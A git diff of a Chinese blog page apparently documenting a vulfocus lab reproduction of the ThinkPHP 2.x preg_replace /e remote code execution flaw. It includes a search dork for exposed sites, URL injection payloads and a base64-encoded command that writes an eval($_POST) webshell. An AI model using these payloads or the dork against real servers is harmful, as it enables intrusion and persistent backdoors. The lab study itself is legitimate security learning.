@@ -369,7 +369,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          891 字
+          771 字
         
       </span>
     
@@ -380,7 +380,7 @@ mjx-container[display="true"] + br {
         
         
         
-          8 分钟
+          7 分钟
         
       </span>
     
@@ -441,18 +441,18 @@ mjx-container[display="true"] + br {
                 <p>vulfocus靶场复现</p>
 <span id="more"></span>
 
-<h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 &#123; Fast &amp; Simple OOP PHP Framework &#125;</code></p>
+<h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }</code></p>
 <h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p>
 <p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'@(w+)'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'([^'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'/]+)@e'</span>, <span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure>
 
 <p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p>
 <p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p>
 <p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span><br></code></pre></td></tr></table></figure>
 
 <p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/$&#123;@print(THINK_VERSION)&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/${@print(THINK_VERSION)}<br></code></pre></td></tr></table></figure>
 
 <p>写入木马：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure>
@@ -462,7 +462,7 @@ mjx-container[display="true"] + br {
 <h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p>
 <img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>测试是否存在，拼接路由<code>/index.php/module/action/param1/$&#123;@phpinfo()&#125;</code></p>
+<p>测试是否存在，拼接路由<code>/index.php/module/action/param1/${@phpinfo()}</code></p>
 <img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png" srcset="/img/loading.gif" lazyload class="">
 
 
